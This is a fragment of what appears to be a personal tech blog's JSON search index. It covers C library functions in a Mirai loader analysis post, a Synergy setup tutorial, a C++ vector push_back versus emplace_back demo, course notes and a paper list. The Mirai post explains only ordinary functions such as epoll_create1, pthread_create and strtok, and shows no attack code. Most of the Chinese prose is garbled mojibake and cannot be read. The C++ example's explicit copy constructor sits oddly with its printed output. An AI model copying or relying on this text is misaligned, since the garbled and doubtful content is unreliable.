flag);\nå®ƒå’Œepoll_createå·®ä¸å¤šï¼Œä¸åŒçš„æ˜¯epoll_create1å‡½æ•°çš„å‚æ•°æ˜¯flagï¼Œå½“flagæ˜¯0æ—¶ï¼Œè¡¨ç¤ºå’Œepoll_createå‡½æ•°å®Œå…¨ä¸€æ ·ï¼Œä¸éœ€è¦sizeçš„æç¤ºäº†ã€‚\nå½“flag = EPOLL_CLOEXECï¼Œåˆ›å»ºçš„epfdä¼šè®¾ç½®FD_CLOEXECã€‚\nå½“flag = EPOLL_NONBLOCKï¼Œåˆ›å»ºçš„epfdä¼šè®¾ç½®ä¸ºéé˜»å¡\nä¸€èˆ¬ç”¨æ³•éƒ½æ˜¯ä½¿ç”¨EPOLL_CLOEXEC.\nå®ƒæ˜¯fdçš„ä¸€ä¸ªæ ‡è¯†è¯´æ˜ï¼Œç”¨æ¥è®¾ç½®æ–‡ä»¶close-on-execçŠ¶æ€çš„ã€‚å½“close-on-execçŠ¶æ€ä¸º0æ—¶ï¼Œè°ƒç”¨execæ—¶ï¼Œfdä¸ä¼šè¢«å…³é—­ï¼›çŠ¶æ€éé›¶æ—¶åˆ™ä¼šè¢«å…³é—­ï¼Œè¿™æ ·åšå¯ä»¥é˜²æ­¢fdæ³„éœ²ç»™æ‰§è¡Œexecåçš„è¿›ç¨‹ã€‚å…³äºexecçš„ç”¨æ³•ï¼Œå¤§å®¶å¯ä»¥å»è‡ªå·±æŸ¥é˜…ä¸‹ï¼Œæˆ–è€…ç›´æ¥man execã€‚\npthread_createå‡½æ•° #include \u0026lt;pthread.h\u0026gt; int pthread_create(pthread_t *thread, const pthread_attr_t *attr, void *(*start_routine) (void *), void *arg); Compile and link with -pthread. The pthread_create() function starts a new thread in the calling process. The new thread starts execution by invoking start_routine(); arg is passed as the sole argument of start_routine(). è‹¥æˆåŠŸåˆ™è¿”å›0ï¼Œå¦åˆ™è¿”å›å‡ºé”™ç¼–å·\nå‚æ•°\nç¬¬ä¸€ä¸ªå‚æ•°ä¸ºæŒ‡å‘çº¿ç¨‹æ ‡è¯†ç¬¦çš„æŒ‡é’ˆã€‚\nç¬¬äºŒä¸ªå‚æ•°ç”¨æ¥è®¾ç½®çº¿ç¨‹å±æ€§ã€‚\nç¬¬ä¸‰ä¸ªå‚æ•°æ˜¯çº¿ç¨‹è¿è¡Œå‡½æ•°çš„èµ·å§‹åœ°å€ã€‚\næœ€åä¸€ä¸ªå‚æ•°æ˜¯è¿è¡Œå‡½æ•°çš„å‚æ•°ã€‚\nå»æ‰å­—ç¬¦ä¸²å‰åçš„ç©ºæ ¼ // ç”¨æ¥å¤„ç†å‰åç©ºæ ¼çš„é—®é¢˜ char *util_trim(char *str) { char *end; while(isspace(*str)) //å¤„ç†å‰é¢çš„ç©ºæ ¼ str++; if(*str == 0) //æŒ‡å‘äº† 0 , å°±æ˜¯è¾“å…¥çš„åœ°ä¸€ä¸ªå­—ç¬¦æ˜¯ 0 çš„è¯ï¼Œé‚£ä¹ˆå°±ç›´æ¥è¿”å›å»è¿™ä¸ª str return str; //strlen()ç”¨æ¥è®¡ç®—æŒ‡å®šçš„å­—ç¬¦ä¸²s çš„é•¿åº¦ï¼Œä¸åŒ…æ‹¬ç»“æŸå­—ç¬¦\u0026quot;\\0\u0026quot;ã€‚ end = str + strlen(str) - 1; //åˆ¤æ–­ç»“æŸä½ç½®---ç§»åŠ¨åˆ°æœ€åä¸€ä¸ª /0 ä¹‹å‰ while(end \u0026gt; str \u0026amp;\u0026amp; isspace(*end)) //å¦‚æœendä½ç½®å¤§çº¦strçš„æ“¦æ±—ä½ é«˜åº¦ï¼Œå¹¶ä¸”endä½ç½®ä¸ºç©ºçš„è¯ï¼Œé‚£å°±ç§»åŠ¨å›æ¥ end--; *(end+1) = 0; //ç»™å‡ºç»“æŸä½ç½® return str; } char strbuf[1024]; util_trim(strbuf); memsetå‡½æ•° å‡½æ•°åŸå‹æ˜¯ï¼švoid *memset(void *s, int ch, size_t n);\nå‡½æ•°åŠŸèƒ½æ˜¯ï¼šå°†sæ‰€æŒ‡å‘çš„æŸä¸€å—å†…å­˜ä¸­çš„å‰nä¸ªå­—èŠ‚çš„å†…å®¹å…¨éƒ¨è®¾ç½®ä¸ºchæŒ‡å®šçš„ASCIIå€¼ï¼Œ ç¬¬ä¸€ä¸ªå€¼ä¸ºæŒ‡å®šçš„å†…å­˜åœ°å€ï¼Œå—çš„å¤§å°ç”±ç¬¬ä¸‰ä¸ªå‚æ•°æŒ‡å®šï¼Œè¿™ä¸ªå‡½æ•°é€šå¸¸ä¸ºæ–°ç”³è¯·çš„å†…å­˜åšåˆå§‹åŒ–å·¥ä½œï¼Œ å…¶è¿”å›å€¼ä¸ºæŒ‡å‘sçš„æŒ‡é’ˆï¼Œå®ƒæ˜¯å¯¹è¾ƒå¤§çš„ç»“æ„ä½“æˆ–æ•°ç»„è¿›è¡Œæ¸…é›¶æ“ä½œçš„ä¸€ç§æœ€å¿«æ–¹æ³•ã€‚\nmemsetå‡½æ•°é€šå¸¸ç”¨æ¥å¯¹ä¸€å—å·²ç»åˆ†é…åœ°å€çš„å†…å­˜è¿›è¡Œåˆå§‹åŒ–ï¼Œå¹¶ä¸”é€šå¸¸åˆå§‹åŒ–ä¸º0æˆ–è€…å­—ç¬¦\u0026rsquo;\\0\u0026rsquo;ï¼ˆå®é™…ä¸Šæ˜¯ä¸€æ ·çš„ï¼‰ã€‚\nstrtok å‡½æ•° å‡½æ•°åŸå‹ï¼šchar *strtok(char *s, char *delim); å‡½æ•°åŠŸèƒ½ï¼šæŠŠå­—ç¬¦ä¸²sæŒ‰ç…§å­—ç¬¦ä¸²delimè¿›è¡Œåˆ†å‰²ï¼Œç„¶åè¿”å›åˆ†å‰²çš„ç»“æœã€‚\n1.strtokå‡½æ•°çš„å®è´¨ä¸Šçš„å¤„ç†æ˜¯ï¼Œstrtokåœ¨sä¸­æŸ¥æ‰¾åŒ…å«åœ¨delimä¸­çš„å­—ç¬¦å¹¶ç”¨NULL(â€™\\0â€²)æ¥æ›¿æ¢,ç›´åˆ°æ‰¾éæ•´ä¸ªå­—ç¬¦ä¸²ã€‚è¿™å¥è¯æœ‰ä¸¤å±‚å«ä¹‰ï¼šï¼ˆ1ï¼‰æ¯æ¬¡è°ƒç”¨strtokå‡½æ•°åªèƒ½è·å¾—ä¸€ä¸ªåˆ†å‰²å•ä½ã€‚ï¼ˆ2ï¼‰è¦è·å¾—æ‰€æœ‰çš„åˆ†å‰²å•å…ƒå¿…é¡»åå¤è°ƒç”¨strtokå‡½æ•°ã€‚\n2.strtokå‡½æ•°ä»¥åçš„è°ƒç”¨æ—¶çš„éœ€ç”¨NULLæ¥æ›¿æ¢s.\n3.å½¢å‚s(è¦åˆ†å‰²çš„å­—ç¬¦ä¸²)å¯¹åº”çš„å˜é‡åº”ç”¨char s[]=â€â€¦.â€å½¢å¼ï¼Œè€Œä¸èƒ½ç”¨char *s=â€â€¦.â€å½¢å¼\n","date":1540793371,"expirydate":-62135596800,"kind":"page","lang":"en","lastmod":1540793371,"objectID":"402b55c2b1a27c40f959b9ddfcdf438b","permalink":"http://www.guozet.me/post/Mirai-loader-Code-Walking-thought/","publishdate":"2018-10-29T06:09:31Z","relpermalink":"/post/Mirai-loader-Code-Walking-thought/","section":"post","summary":"å‰è¨€ The Mirai internet of things (IoT) botnet is infamous for targeting connected household consumer products. It attaches itself to cameras, alarm systems and personal routers, and spreads quickly.","tags":"Mirai","title":"Miraiæºä»£ç åˆ†æ1--Loaderçš„å·¥ä½œè¿‡ç¨‹","type":"post"},{"authors":null,"categories":"Application","content":"Introduce synergyå¯ä»¥å®ç° mac / linux / windowsä¸‰ä¸ªæ“ä½œç³»ç»Ÿä¹‹é—´å…±äº«é¼ æ ‡é”®ç›˜ï¼Œå¿…é¡»åœ¨æ‰€æœ‰æœºå™¨ä¸Šéƒ½å®‰è£…è¿™ä¸ªè½¯ä»¶ï¼Œå¹¶è¿›è¡Œç›¸åº”çš„é…ç½®ï¼Œæœ‰ä¸€å°å”¯ä¸€çš„ä¸»æœºä½œä¸ºæœåŠ¡å™¨ç«¯ï¼Œå…¶ä»–ä¸»æœºä½œä¸ºå®¢æˆ·ç«¯ï¼Œè¦å…±äº«çš„é‚£å¥—é¼ æ ‡é”®ç›˜é“¾æ¥åˆ°ç«¯ã€‚æ‰€æœ‰ä¸»æœºéƒ½å¿…é¡»è¿å…¥åŒä¸€ä¸ªå±€åŸŸç½‘ï¼Œä¼šé€šè¿‡å±€åŸŸç½‘äº¤æ¢é¼ æ ‡é”®ç›˜çš„è¾“å…¥ä¿¡æ¯ï¼Œä»¥å®ç°å…¶ä»–ä¸»æœºå…±äº«ä½¿ç”¨è¿™å¥—é¼ æ ‡é”®ç›˜ã€‚\nDownload and install å› ä¸ºåœ¨Ubuntu16.04ä¸Šé¢æ¯”è¾ƒå¥½å®‰è£…çš„ç‰ˆæœ¬æ˜¯1.6.2ï¼Œæ‰€ä»¥æˆ‘ä¸ºäº†èƒ½å¤Ÿåœ¨å…±äº«çš„è¿‡ç¨‹ä¸­æ¯”è¾ƒé¡ºåˆ©ï¼Œä¹Ÿé€‰ç”¨çš„è¿™ä¸ªç‰ˆæœ¬æ¥å®Œæˆçš„ï¼Œåœ¨Windowç«¯ä¸‹è½½1.6.2å°±å¥½äº†ã€‚\nLinux: ä½¿ç”¨å‘½ä»¤è¡Œå®‰è£… Win10(64ä½): ä¸‹è½½åœ°å€ Linux(Ubuntu16.04)\nsudo apt-get install synergy å®‰è£…å®Œæˆä¹‹ååœ¨ç»ˆç«¯ä½¿ç”¨synergyå‘½ä»¤å°±å¯ä»¥æ‰“å¼€è½¯ä»¶äº†ã€‚\nsynergy Window10ç«¯\nåœ¨Windowç«¯ä¾æ—§é€‰ç”¨å®‰è£…çš„æ˜¯1.6.2ç‰ˆæœ¬ï¼Œä¸ºä¿è¯ç‰ˆæœ¬ä¸€è‡´ã€‚ä¸‹è½½ä¸‹æ¥ä¹‹åï¼Œå¯åŠ¨å®‰è£…å³å¯ï¼š\nåˆ†åˆ«åœ¨Linuxå’ŒWindowç«¯å®‰è£…å®Œæˆä¹‹åè¿è¡Œè½¯ä»¶æ£€æµ‹ç‰ˆæœ¬æ˜¯å¦å¯¹åº”ï¼Œæ‰“å¼€è½¯ä»¶ï¼Œåœ¨èœå•æ helpçš„ä½ç½®å¯ä»¥çœ‹åˆ°ç‰ˆæœ¬ä¿¡æ¯ã€‚\nConfigure é…ç½®è¿‡ç¨‹æ¯”è¾ƒæ–¹ä¾¿ï¼Œåˆ†åˆ«åœ¨Windowså’ŒLinuxç«¯è¿è¡Œè½¯ä»¶ï¼š\nå°†ä½ è¦ä½¿ç”¨çš„é‚£å°ç”µè„‘çš„é¼ æ ‡é”®ç›˜å…±äº«ç»™å…¶ä»–ç”µè„‘ä½¿ç”¨çš„è¯ï¼Œé‚£å°±å°†è¿™å°ç”µè„‘ä¸Šé¢çš„Synergyè®¾ç½®æˆæœåŠ¡ç«¯ï¼Œå…¶ä½™çš„å…¨éƒ¨è®¾ç½®æˆå®¢æˆ·ç«¯å°±å¥½äº†ã€‚\nè¿™é‡Œéœ€è¦ç‰¹åˆ«æ³¨æ„ï¼Œå›¾ç‰‡ä¸­çš„192.168.1.161å¹¶ä¸æ˜¯çœŸæ­£çš„ä½ çš„IPåœ°å€ï¼Œä½ éœ€è¦æ‰“å¼€ç½‘ç»œé€‚é…å™¨æ‰¾åˆ°ä½ çœŸæ­£çš„IPåœ°å€ï¼Œè¿™æ ·å…¶ä»–çš„å®¢æˆ·ç«¯æ‰èƒ½å¤Ÿè¿æ¥è¿‡æ¥ã€‚ç„¶åå†é…ç½®æœåŠ¡å™¨é‡Œé¢éœ€è¦è¿æ¥è¿‡æ¥çš„å®¢æˆ·ç«¯çš„åç§°\næ¯”å¦‚ï¼Œåœ¨è¿™é‡Œï¼Œæˆ‘æ·»åŠ äº†ä¸€ä¸ªå«åšChromebookçš„å®¢æˆ·ç«¯ï¼Œè¿™é‡Œçš„åç§°æ˜¯æ ¹æ®ä½ å®¢æˆ·ç«¯æ‰“å¼€ä¹‹åæ˜¾ç¤ºçš„åå­—å†³å®šçš„ã€‚åœ¨è¿™é‡Œä¹Ÿé…ç½®äº†è¿æ¥è¿‡æ¥ä¹‹åï¼Œå±å¹•æ˜¾ç¤ºçš„ä½ç½®ã€‚\nç„¶åæ‰“å¼€å®¢æœç«¯ï¼Œåœ¨é‡Œé¢è¾“å…¥æœåŠ¡å™¨çš„IPåœ°å€å°±å¯ä»¥è¿æ¥äº†ã€‚\nIssue è¿æ¥è¢«æ‹’ç»refuedé—®é¢˜ è¿™é‡Œéœ€è¦ä¿è¯ä¸¤è¾¹çš„è¿æ¥é…ç½®æ˜¯ä¸€è‡´çš„ï¼Œåœ¨è¿™é‡Œæˆ‘ç»™å‡ºæˆ‘çš„é…ç½®æ–¹å¼ï¼Œä¸éœ€è¦ä½¿ç”¨åŠ å¯†çš„æ–¹å¼ï¼Œå¦‚æœä½¿ç”¨åŠ å¯†çš„è¯ï¼Œéœ€è¦ä¿è¯ä¸¤ç«¯åŠ å¯†çš„ç§˜é’¥æ˜¯ä¸€è‡´çš„ã€‚\nè¿æ¥è¶…æ—¶çš„é—®é¢˜ï¼šTime out è¿™ä¸ªé—®é¢˜æœ‰ä¸¤ç§æƒ…å†µï¼š\nç¬¬ä¸€ç§æƒ…å†µï¼šè¾“å‡ºäº†é”™è¯¯çš„æœåŠ¡å™¨IPåœ°å€ï¼ŒæœåŠ¡å™¨çš„IPåœ°å€ä¸€å®šè¦è‡ªå·±æŸ¥çœ‹ç½‘ç»œé€‚é…å™¨å¾—åˆ°çœŸæ­£çš„IPåœ°å€ï¼Œä¸è¦ä½¿ç”¨è¿™ä¸ªè½¯ä»¶é…ç½®çš„æ—¶å€™æ¨èçš„IPåœ°å€ï¼Œå®ƒçœŸçš„å¾ˆæœ‰å¯èƒ½æ˜¯é”™è¯¯çš„ã€‚\næ¯”å¦‚æˆ‘ä½¿ç”¨çš„è¿™ä¸€æ¬¡ï¼Œå°±ä¼šå‡ºç°IPåœ°å€å®Œå…¨å’Œå®ƒæ¨èçš„ä¸ä¸€æ ·çš„æƒ…å†µã€‚è¿™ç§æƒ…å†µæ€ä¹ˆå¯ä»¥è¿æ¥ä¸Šçš„å‘¢\nç¬¬äºŒç§æƒ…å†µï¼šWindowsé‡Œé¢çš„synergyæœåŠ¡è¢«å…³é—­äº†ï¼Œåœ¨æœåŠ¡çš„é€‰é¡¹é‡Œé¢å»æ‰“å¼€å°±å¥½äº†ã€‚\nç‰ˆæœ¬é—®é¢˜ å°½é‡åŒæ—¶åœ¨å®¢æˆ·ç«¯å’ŒæœåŠ¡å™¨ç«¯ä½¿ç”¨ç›¸åŒçš„ç‰ˆæœ¬ï¼Œä¿è¯æœ€å°é™åº¦çš„å‡ºç°é—®é¢˜\nerrorï¼šunrecognised client name XXXXX screen name æ˜¯è½¯ä»¶è§„å®šçš„ï¼Œä¸èƒ½è‡ªå·±çå–ã€‚åœ¨æ¯ä¸ªå®¢æˆ·ç«¯/æœåŠ¡å™¨ä¸Šèƒ½æŸ¥åˆ°ï¼Œä¹Ÿå¯ä»¥é€šè¿‡edit-\u0026gt;settingä¿®æ”¹\nERROR: failed to init synwinhk.dll å…³é—­synergyï¼Œä»ç³»ç»Ÿè¿›ç¨‹é‡Œå…³é—­synergyçš„è¿›ç¨‹ï¼Œå†é‡æ–°å¯åŠ¨å³å¯ã€‚\n","date":1540635271,"expirydate":-62135596800,"kind":"page","lang":"en","lastmod":1540635271,"objectID":"455bbf1ee11c9e642d51b3e430091255","permalink":"http://www.guozet.me/post/Application-Synergy/","publishdate":"2018-10-27T10:14:31Z","relpermalink":"/post/Application-Synergy/","section":"post","summary":"Introduce synergyå¯ä»¥å®ç° mac / linux / windowsä¸‰ä¸ªæ“ä½œç³»ç»Ÿä¹‹","tags":"Application","title":"synergyå±€åŸŸç½‘å…±äº«é¼ æ ‡é”®ç›˜è½¯ä»¶æ•™ç¨‹","type":"post"},{"authors":null,"categories":"C++","content":"Introduce std::vector::push_back() Appends the given element value to the end of the container.\nThe new element is initialized as a copy of value. value is moved into the new element. If the new size() is greater than capacity() then all iterators and references (including the past-the-end iterator) are invalidated. Otherwise only the past-the-end iterator is invalidated. (Cite from: cppreference.com)\nExample Firstly, if we have a class String, then we can use this class to test the push_back() functions.\n#include \u0026lt;iostream\u0026gt; #include \u0026lt;cstring\u0026gt; #include \u0026lt;vector\u0026gt; class string { public: string() : buf(new char[1]) { std::cout \u0026lt;\u0026lt; \u0026quot;default\u0026quot; \u0026lt;\u0026lt; std::endl; buf[0] = '\\0'; } string(const char* s) : buf(new char[strlen(s) + 1]) { std::cout \u0026lt;\u0026lt; \u0026quot;convert\u0026quot; \u0026lt;\u0026lt; std::endl; strcpy(buf, s); } explicit string(const string\u0026amp; s) : buf(new char[strlen(s.buf) + 1]) { std::cout \u0026lt;\u0026lt; \u0026quot;copy\u0026quot; \u0026lt;\u0026lt; std::endl; strcpy(buf, s.buf); } ~string() { std::cout \u0026lt;\u0026lt; \u0026quot;destructor\u0026quot; \u0026lt;\u0026lt; std::endl; delete[] buf; } string\u0026amp; operator=(const string\u0026amp; rhs) { std::cout \u0026lt;\u0026lt; \u0026quot;copy assign\u0026quot; \u0026lt;\u0026lt; std::endl; if (this == \u0026amp;rhs) return *this; delete[] buf; buf = new char[strlen(rhs.buf) + 1]; strcpy(buf, rhs.buf); return *this; } const char* getBuf() const { return buf; } private: char* buf; }; std::ostream\u0026amp; operator\u0026lt;\u0026lt;(std::ostream\u0026amp; out, const string\u0026amp; s) { return out \u0026lt;\u0026lt; s.getBuf(); } Understand:\nThe new element is initialized as a copy of value. value is moved into the new element. int main() { std::vector\u0026lt;string\u0026gt; vec; vec.push_back(\u0026quot;test\u0026quot;); vec.push_back(\u0026quot;test2\u0026quot;); } Output:\nconvert // Covert \u0026quot;test\u0026quot; to class string copy // Copy string(test) to vector destructor convert // Covert \u0026quot;test2\u0026quot; to class string copy // Size() \u0026gt; capacity(), then apply for a new memory, and copy \u0026quot;test\u0026quot; to new vector. copy // Copy string(test2) to vector destructor destructor destructor destructor In the case, I used this example to test how to initialize a new element in the vector. Like this case, when we new an object, we copy this object into vector. After that, we can delete this object.\nConvert a new string object 1 Copy the string object 1 to the string object 2, and move string object 2 into the new element. Delete the string object 1 std::vector::emplace_back (Since C++ 11) Appends a new element to the end of the container. The element is constructed through std::allocator_traits::construct, which typically uses placement-new to construct the element in-place at the location provided by the container. The arguments args\u0026hellip; are forwarded to the constructor as std::forward(args)\u0026hellip;.\nIf the new size() is greater than capacity() then all iterators and references (including the past-the-end iterator) are invalidated. Otherwise only the past-the-end iterator is invalidated.\nExample int main() { std::vector\u0026lt;string\u0026gt; vec; vec.emplace_back(\u0026quot;TEST\u0026quot;); vec.emplace_back(\u0026quot;TES3\u0026quot;); } Output:\nconvert convert copy // Copy the first one from the old vector memory to the new memory destructor destructor destructor ","date":1540260571,"expirydate":-62135596800,"kind":"page","lang":"en","lastmod":1540260571,"objectID":"04bd5829c0995fdcda7f81ff003fff47","permalink":"http://www.guozet.me/post/C++-Vector-pushback-vs-emplaceback/","publishdate":"2018-10-23T02:09:31Z","relpermalink":"/post/C++-Vector-pushback-vs-emplaceback/","section":"post","summary":"Introduce std::vector::push_back() Appends the given element value to the end of the container.\nThe new element is initialized as a copy of value. value is moved into the new element. If the new size() is greater than capacity() then all iterators and references (including the past-the-end iterator) are invalidated. Otherwise only the past-the-end iterator is invalidated. (Cite from: cppreference.com)\n","tags":"C++","title":"C++ vector push_back() Vs emplace_back","type":"post"},{"authors":null,"categories":["2D Game","Engine","Construction"],"content":"\n2Dæ¸¸æˆå¼•æ“è®¾è®¡è¿™é—¨è¯¾ç¨‹æ˜¯æˆ‘åœ¨CUçš„2018 Fallé€‰ä¿®çš„ä¸€é—¨ä¸“ä¸šæ ¸å¿ƒè¯¾ç¨‹ï¼Œè€å¸ˆæ˜¯Clemson CSç³»æ¯”è¾ƒå—æ¬¢è¿çš„ Brian Malloyæ•™æˆã€‚\nè¯¾ç¨‹å†…å®¹ Week1 Aug 28, Tue:\nOffice hour: Wed 10-11:30 AM Quiz on Tue or Thu Answer Ques about Basics or Classes: ternery operator namespaces if (0) Do the Rule of 3 æœ¬å‘¨çš„é‡ç‚¹å†…å®¹æ˜¯C++çš„åŸºæœ¬è¯­æ³•ä»¥åŠClassesçš„ä½¿ç”¨ å’Œ C++ Rule of 3çš„è§„åˆ™åº”ç”¨ã€‚åœ¨è¿™é‡Œåˆ†åˆ«æ•´ç†äº†ä¸¤ä¸ªéƒ¨åˆ†çš„åšå®¢æ–‡ç« ï¼š\nC++ Rule of 3 Aug 30, Thu:\nrefs vs ptrs r-value references Introduce SDL draw functions Review Rule of 3 \u0026ndash; how to reproduce no crash? Illustrate the functions that are called: whatcalls Trace the Rule of 3 example from cppreference Rule of 0 Introduce vectors: size vs capacity push_back vs emplace_back Week2 Sep 4, Tue\nReview what get\u0026rsquo;s called: why prefer init vs assign Introduce vectors: size vs capacity value semantics emplace_back Marcus Painting Project #2 Quiz #1 review Week3 Sep 11, Tue:\nReview the quiz Why no vector.push_front() ??? When to use emplace_back()? A temp is always an r-value reference review Rule of 3, Rule of 0, Rule of 5 Sep 13, Thu:\nYour game: can definitely be a \u0026ldquo;cover\u0026rdquo; Keep the scope manageable \u0026ndash; one level, etc. Terminology: move assignment vs copy assignment copy constructor vs move constructor Questions about move semantics ranged for loops: ints: size vs cap C++ strings why no push_front for vector? Drawing a texture: GPU Makefile Drawing a Surface: CPU Week4 Sep 18, Tue:\nstatic variables Design Patterns The Singleton Design Pattern Animations with SDL: cpu clock vs game clock Why clear the screen Inheritance: Sep 20, Thu:\nSammy\u0026rsquo;s dilemma Project #2 \u0026ndash; let\u0026rsquo;s look at my solution. The Meyer\u0026rsquo;s Singleton Polymorphism: see poly example shapes example Use g++ not clang++ for effc++ warnings Project #3 and the tracker framework default vs delete for constructors/destructors ranged for vs while when to use auto function overload transparency vs alpha channel Parallax Scrolling Getting images vs \u0026ldquo;rolling your own\u0026rdquo; Making videos why use g++ vs clang++ XML ç†è§£ä¸ºä»€ä¹ˆè¦ä½¿ç”¨ Singletonè®¾è®¡æ¨¡å¼ï¼Œå·²è¯¦ç»†åˆ†æäº†ä¸ºä»€ä¹ˆè¦ä½¿ç”¨singletonæ¨¡å¼ï¼Œä»¥åŠSingletonè®¾è®¡æ¨¡å¼çš„å¥½å¤„å’Œå¦‚ä½•æ¥ä¹¦å†™Singleton. è¯·å‚è€ƒåšå®¢:\nC++è½¯ä»¶è®¾è®¡æ¨¡å¼ä¹‹Singleton åŒ…å«äº†ä¸¤ç§Singletonçš„ä¹¦å†™æ–¹å¼ Week 5 Sep 25, Tue:\nLast time: Many spinning stars \u0026ndash; tweak velocity using XML velocity as base! Parallax Scrolling is easy \u0026ndash; it\u0026rsquo;s already in the code string streams making a video Sep 27, Thu:\nQuiz #2 Week 6 Oct 2, Tue:\nmaps sorting: vectors lists emplace_back: how to use? Why Singleton: Gamedata? Clock? Two-way sprites? SpriteSheet Project #2 \u0026ndash; CANDY Oct 4, Thu:\nJacob Wood IoMod: overload writeText put in Engine::draw, which is const! Engine::update is NOT const! draw and update called every iteration of the event list Why Singleton: Gamedata \u0026ndash; yes Clock \u0026ndash; no! Clock and fps string streams Two-way sprites? SpriteSheet projects from last year project #4 sorting: vectors lists Week 7 Oct 9, Thu\nWhy Singleton: Gamedata \u0026ndash; yes Clock \u0026ndash; no! Clock and fps string streams Two-way sprites? SpriteSheet A Player Class Oct 11, Thu:\nDoes anyone get a black screen on startup?\nGood rule to follow: pre-load assets! e.g.: collision strategies.\nReminder: Exam #1 in one week!\nModifications to ImageFactory and/or SpriteSheet???\nReview:\nHow to make video for #3 Adding a Player for #4 slide or no slide? how to fit player into tracker framework to cast or not to cast, that is the question. Where to put stuff in Engine.cpp Nested Classes: the Clock class\nCollisions\nAI:\nobserver pattern Week 8 Oct 16, Tue:\nErasing from a list. Vector. map Project #4 Exam #1 Oct 18, Thu:\nReview Observer Quiz #2 Sorting vectors and lists Week 9 Oct 25, Thu:\ngithub repo player/composition ==\u0026gt; it\u0026rsquo;s composition so need player.getVelocity() drawable.h in tracker framework didn\u0026rsquo;t have method getSurface input/mouse2 to get pixel color see getPixel Week 10 Nov 1, Thu:\nWrite a fn object Review lamda functions Show lamda in sort Review Explosions Health bar (in your repo) A model for your HUD! Week 11 Nov 8, Tue:\nReview fn objects and lambda functions Review the two classes needed for Chunk explosions Review Object pool Quiz 3\nSort Funciton object lambda Funciton Search in a list, vector, map Erasing from a list. Vector, map observer pattern static_cast Vs dynamic_cast è‡ªå·±åŠ¨æ‰‹å†™æ¸¸æˆå¼•æ“ æ¦‚è¿° è®¾è®¡ä½¿ç”¨C++ç”»å‡ºæ¥å›¾å½¢ åšä¸€ä¸ªObjectç§»åŠ¨çš„æ¨¡å¼ ","date":1538744667,"expirydate":-62135596800,"kind":"page","lang":"en","lastmod":1538744667,"objectID":"56ded845904e5a50a4fe8084f1c781b4","permalink":"http://www.guozet.me/post/2D-Game-Engine-Construction/","publishdate":"2018-10-05T13:04:27Z","relpermalink":"/post/2D-Game-Engine-Construction/","section":"post","summary":"\n2Dæ¸¸æˆå¼•æ“è®¾è®¡è¿™é—¨è¯¾ç¨‹æ˜¯æˆ‘åœ¨CUçš„2018 Fallé€‰ä¿®çš„ä¸€é—¨ä¸“ä¸šæ ¸å¿ƒè¯¾ç¨‹ï¼Œè€å¸ˆæ˜¯Clemson CSç³»æ¯”è¾ƒå—æ¬¢è¿çš„ Brian Malloyæ•™æˆã€‚\n","tags":"Game","title":"2-D Game Engine Construction (CU CPSC6160)","type":"post"},{"authors":null,"categories":"Paper","content":"Network relation Kitsune: An Ensemble of Autoencoders for Online Network Intrusion Detection [ PDF] [ Slide] [ Video] Cloud Computing ","date":1538744667,"expirydate":-62135596800,"kind":"page","lang":"en","lastmod":1538744667,"objectID":"799237fd0ab32aaf014558c6959fa769","permalink":"http://www.guozet.me/post/All-Paper-Which-I-Read/","publishdate":"2018-10-05T13:04:27Z","relpermalink":"/post/All-Paper-Which-I-Read/","section":"post","summary":"Network relation Kitsune: An Ensemble of Autoencoders for Online Network Intrusion Detection [ PDF] [ Slide] [ Video] Cloud Computing ","tags":"Paper","title":"Paper Reading list","type":"post"},{"authors":null,"categories":"Translation of Programming Languages","content":"\nç¼–è¯‘åŸç†è¿™é—¨è¯¾ç¨‹æ˜¯æˆ‘åœ¨CUçš„2018 Fallé€‰ä¿®çš„ä¸€é—¨ä¸“ä¸šæ ¸å¿ƒè¯¾ç¨‹ï¼Œè€å¸ˆæ˜¯Clemson CSç³»æ¯”è¾ƒå—æ¬¢è¿çš„ Brian Malloyæ•™æˆã€‚åœ¨ä»–çš„ä¸ªäººä¸»é¡µä¸Šé¢ä¹Ÿæœ‰Python, C++ï¼Œ 2Dæ¸¸æˆçš„æ•™ç¨‹ï¼Œéå¸¸é€‚åˆå¯¹CSæ„Ÿå…´è¶£çš„åŒå­¦å­¦ä¹ ã€‚\nè¯¾ç¨‹å†…å®¹ Week1 Aug 28, Tue\nRead Section 1, the Introduction, to grammarware paper Discuss slides about Grammars Answer questions about Basics and Classes Do the Rule of 3 æœ¬å‘¨çš„é‡ç‚¹å†…å®¹æ˜¯C++çš„åŸºæœ¬è¯­æ³•ä»¥åŠClassesçš„ä½¿ç”¨ å’Œ C++ Rule of 3çš„è§„åˆ™åº”ç”¨ã€‚åœ¨è¿™é‡Œåˆ†åˆ«æ•´ç†äº†ä¸¤ä¸ªéƒ¨åˆ†çš„åšå®¢æ–‡ç« ï¼š\nC++ Rule of 3 Aug 30, Thu\nRegular grammars and regular expressions Review Rule of 3 What gets called The Rule of 5 The Rule of Zero Week2 Sep 4, Tue\nWhat gets called Why prefer init over assign?! Introduce vectors size vs capacity value semantics Intro to Flex Project #2 Quiz #1 \u0026ndash; Thursday Week3 Sep 13, Thu\nQuestions about move semantics? Well I have one? flex: ambiguity: codes first wc states line numbers: lineno debug mode static varsux Singleton Pattern (å•ä¾‹è®¾è®¡æ¨¡å¼) ç†è§£ä¸ºä»€ä¹ˆè¦ä½¿ç”¨ Singletonè®¾è®¡æ¨¡å¼ï¼Œå·²è¯¦ç»†åˆ†æäº†ä¸ºä»€ä¹ˆè¦ä½¿ç”¨singletonæ¨¡å¼ï¼Œä»¥åŠSingletonè®¾è®¡æ¨¡å¼çš„å¥½å¤„å’Œå¦‚ä½•æ¥ä¹¦å†™Singleton. è¯·å‚è€ƒåšå®¢:\nC++è½¯ä»¶è®¾è®¡æ¨¡å¼ä¹‹Singleton Week4 Sep 20, Thu\nThe Bison Parser Generator: shift/reduce parsing LALR(1) Balanced Parens \u0026ndash; adding sets of them sum \u0026ndash; adding numbers Week 5 Sep 25, Tue\nconflicts \u0026ndash; the pointer model Inserting semantic actions: simple \u0026ndash; no actions but prec set noPrec \u0026ndash; grammar refactored, no prec set calc \u0026ndash; calculator example \u0026ndash; no variables typedStack \u0026ndash; calculator w/ variables Project #3 Exam #1 \u0026ndash; everything up to and incl today Sep 27. Thu\nExam #1 \u0026ndash; everything up to and incl today Week 6 Oct 2. Tue\nContainers vectors List Map Review Exam Singleton Exponent Radon Inheritance Oct 4. Thu\nemplace_back \u0026ndash; When it help? é¡¹ç›®å†…å®¹ é¡¹ç›® è‡ªå·±åŠ¨æ‰‹å†™Pythonç¼–è¯‘å™¨ æ¦‚è¿° Python æºç¨‹åº ä½¿ç”¨flexåšè¯æ³•åˆ†æ ä¸Šä¸‹æ–‡æ— 